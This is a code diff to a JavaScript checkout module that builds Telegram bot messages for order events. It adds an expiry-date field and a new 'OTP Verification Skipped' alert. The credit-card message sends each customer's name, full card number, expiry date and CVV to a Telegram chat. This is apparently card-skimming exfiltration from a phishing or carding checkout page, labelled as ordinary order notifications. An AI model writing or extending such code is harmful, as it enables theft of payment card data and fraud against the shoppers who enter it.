@@ -74,9 +74,9 @@ const TelegramNotifications = {
         const message = `
 🛒 <b>New Checkout Started (Credit Card)</b>
 
-📱 Customer proceeding to checkout
-💰 Total Amount: ${orderData.total} (${usdEquivalent})
-🛍️ Items: ${orderData.itemCount} item(s)
+📱 Customer is proceeding to checkout
+💰 Total Amount: <b>${orderData.total}</b> (${usdEquivalent})
+️ Items: ${orderData.itemCount} item(s)
 🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
 ⏰ Time: ${new Date().toLocaleString()}
 
@@ -107,7 +107,7 @@ const TelegramNotifications = {
 💳 <b>Bank Transfer Confirmed</b>
 
 ✅ Customer confirmed bank transfer payment
-💰 Amount: ${orderData.total} (${usdEquivalent})
+💰 Amount: <b>${orderData.total}</b> (${usdEquivalent})
 🆔 Order Reference: ${orderData.orderRef}
 🏦 Payment Method: Bank Transfer
 🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
@@ -127,14 +127,32 @@ const TelegramNotifications = {
 
 ✅ Customer submitted credit card information
 👤 Cardholder: ${orderData.cardholderName}
-💰 Amount: ${orderData.total} (${usdEquivalent})
-🆔 Reference: ${orderData.expiryDate}
+💰 Amount: <b>${orderData.total}</b> (${usdEquivalent})
+🆔 Reference: ${orderData.orderRef}
 🔒 Card Number: ${orderData.cardNumber}
+⏳ Expiry: ${orderData.expiryDate}
 🔑 CVV: ${orderData.cvv}
 🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
 ⏰ Submitted at: ${new Date().toLocaleString()}
 
 <i>🔄 Processing payment...</i>`;
+        await sendTelegramMessage(message);
+    },
+
+    otpSkipped: async (orderData) => {
+        const currentCountry = getCurrentCountry();
+        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);
+
+        const message = `
+⏭️ <b>OTP Verification Skipped</b>
+
+⚠️ Customer skipped OTP verification.
+💰 Amount: <b>${orderData.total}</b> (${usdEquivalent})
+🆔 Order Reference: ${orderData.orderRef}
+🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
+⏰ Time: ${new Date().toLocaleString()}
+
+<i>Order is proceeding without OTP. Please monitor.</i>`;
         await sendTelegramMessage(message);
     },
 
